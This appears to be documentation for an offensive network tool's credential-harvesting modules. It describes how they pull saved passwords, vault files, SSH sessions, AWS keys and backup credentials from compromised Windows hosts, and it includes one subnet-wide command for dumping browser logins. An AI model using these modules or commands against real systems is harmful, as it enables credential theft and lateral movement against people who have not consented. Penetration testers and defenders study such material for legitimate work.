# Credential Harvesting Modules

NetExec-RS automates the offline extraction and decryption of saved passwords from development and sysadmin utilities, turning a single compromised developer box into complete lateral dominance.

> [!NOTE]
> All these modules require local admin privileges and execute heavily over SMB to rip the config files locally for processing.

## Browsers & General Software

*   **`firefox`**: Rips the `logins.json` and `key4.db` database from the target `/Users` tree and locally runs the NSS decryption scheme to dump all saved bank/software credentials.
    ```bash
    nxc smb 10.0.0.0/24 -M firefox
    ```
*   **`keeppass_discover`**: Finds and exfiltrates `.kdbx` databases stashed anywhere on the target C:\ drive.
*   **`keepass_trigger`**: Maliciously modifies the `KeePass.config.xml` to inject an export trigger, dropping the master password and CSV in cleartext the next time the admin opens their vault.

## DevOps & Cloud Tooling

*   **`winscp`**: Extracts and decrypts saved FTP/SFTP sessions directly from the `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` remote registry hive.
*   **`mremoteng`**: Searches for `confCons.xml` files and decrypts the connection strings.
*   **`putty`**: Extracts Pageant keys and saved PuTTY sessions.
*   **`mobaxterm`**: Decrypts MobaXterm's custom master-password encryption algorithms.
*   **`aws_credentials`**: Locates and grabs `.aws/credentials` flatfiles containing access/secret keys.
*   **`veeam`**: Grabs hypervisor backup credentials stored within the Veeam SQL database and unpacks them locally.
